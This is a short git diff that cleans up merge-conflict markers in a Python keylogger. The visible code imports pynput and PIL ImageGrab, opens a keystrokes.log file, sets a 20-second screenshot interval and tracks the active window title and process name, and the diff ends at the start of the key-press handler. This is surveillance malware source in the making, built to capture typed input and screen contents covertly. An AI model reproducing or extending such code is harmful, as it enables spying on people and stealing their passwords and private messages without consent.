@@ -7,37 +7,26 @@ import win32process
 from pynput import keyboard
 from PIL import ImageGrab
 
-<<<<<<< HEAD
 
 # Get the current directory (I would change this soon...)
-=======
-# Get the current directory (Change this if you want a customized one. Looking for someone to help me make the GUI)
->>>>>>> 4fbc1c5c589ec246dfad4024c0475d37cb576416
 current_dir = os.getcwd()
 
 # Open the log file for writing
 log_file = open(os.path.join(current_dir, "keystrokes.log"), "w")
-<<<<<<< HEAD
 
 # Set the x interval for taking screenshots (in seconds)
 screenshot_interval = 20
 last_screenshot_time = datetime.datetime.now()
-=======
->>>>>>> 4fbc1c5c589ec246dfad4024c0475d37cb576416
 
 # Track the current window title and process name
 current_window_title = None
 current_process_name = None
 
-<<<<<<< HEAD
 # Another shit for the shift.
 shift_pressed = False
 
 
 # This function gets called every time a key is pressed
-=======
-# This function gets called every time a key is pressed, but for some reason this needs fixing.
->>>>>>> 4fbc1c5c589ec246dfad4024c0475d37cb576416
 def on_press(key):
     global current_window_title, current_process_name, last_screenshot_time
     try:
